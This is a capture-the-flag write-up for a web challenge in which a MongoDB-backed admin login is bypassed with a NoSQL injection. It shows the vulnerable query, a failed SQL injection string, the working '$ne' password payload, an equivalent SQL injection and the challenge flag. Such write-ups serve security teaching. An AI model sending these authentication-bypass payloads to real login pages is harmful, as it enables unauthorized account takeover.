# IRS Internal CTF: Web

## Admin at work (sheepymeh) [50 Points]

**Hmm theres this [admin login website](https://cellsatwork.sheepymeh.tk/admin.html)... Hack it?**

### Solution

This is somewhat of an extension of Cells at work. It involves a more "traditional", but harder to understand injection.

```json
{
    "username": "test",
    "password": "test"
}
```

Nothing easy to find here. If we try an SQL injection like `' OR 1=1;--`, there would be no effect. To understand this, the source code must be evaluated:

```js
db.collection('users').countDocuments({
    username: req.body.username,
    password: req.body.password
})
```

An SQL injection wouldn't work, since the variables are not "injected" into a string, and the database knows that it is a variable.

However, MongoDB also has several [query operators](https://docs.mongodb.com/manual/reference/operator/query/). We can make use of the `$ne` operator, [as stated here](https://nullsweep.com/a-nosql-injection-primer-with-mongo/).

```json
{
    "username": "admin",
    "password": {"$ne": 1}
}
```

This logs us into the admin account, if the password is not equal (`$ne`) to `1`, which it isn't.

This is equivalent to an SQL injection of `SELECT * FROM users WHERE username = 'admin' AND password = '' OR username = admin AND password <> '1'` (inject `' OR username = admin AND password <> '1`).

Other MongoDB injections exist too, and more reading should be done. Leonard's ~~untested~~ excellent [MongoMap](https://github.com/Hex27/mongomap) tool can also be used.

### Flag

```
IRS{UWU_4DM1N_P15_B3_G3NTL3}
```